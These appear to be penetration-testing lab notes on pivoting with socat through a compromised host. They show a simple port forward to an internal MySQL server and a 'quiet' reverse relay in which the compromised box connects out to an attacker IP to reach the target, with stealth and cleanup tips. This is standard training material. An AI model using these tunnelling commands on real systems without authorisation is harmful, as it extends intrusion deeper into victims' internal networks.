## __***Easy way***__
Open up a listening port on the compromised box, redirect traffic that comes into compromised box to the target server.

**Compromised Server**: 172.16.0.5
**Target**: 172.16.0.10 port 3306

Run command on compromised box:
`./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &`

This opens port 33060 on compromised box and redirects input from attacking machine to target server.

`fork` - puts every connection into a new process\
`reuseaddr` - port stays open after a connection is made to it\
`&` - backgrounds the shell

Combined, this allows us to use same port forward for more than one connection

---

## *Quiet way*
Quiet method will not open a port on the compromised box which is risky.

From attacker box:
`socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &`
This opens port 8000 and 8001, creating a local port relay (what goes in one goes out the other)

On the compromised relay box:
`./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &`
This connects attacker listening port 8001 to open port of target server

Using the example IPs from earlier:
`./socat tcp:10.50.73.2:8001 tcp:172.16.0.10:80,fork &`

---

Remember to close background jobs by running `jobs` and killing the job number

